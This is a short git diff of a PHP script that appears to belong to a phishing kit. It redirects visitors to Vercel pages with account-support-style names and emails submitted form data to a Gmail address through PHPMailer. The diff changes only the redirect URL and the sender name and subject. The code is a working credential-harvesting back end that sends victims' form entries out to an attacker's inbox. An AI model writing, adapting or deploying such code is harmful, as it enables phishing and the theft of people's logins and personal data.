@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://issue-account-very.vercel.app/");
+header("Location: https://help-team-review.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -34,7 +34,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('Lernayouamzaxal@gmail.com', 'wahab');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'mf');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'wahab';
+        $mail->Subject = 'mf';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
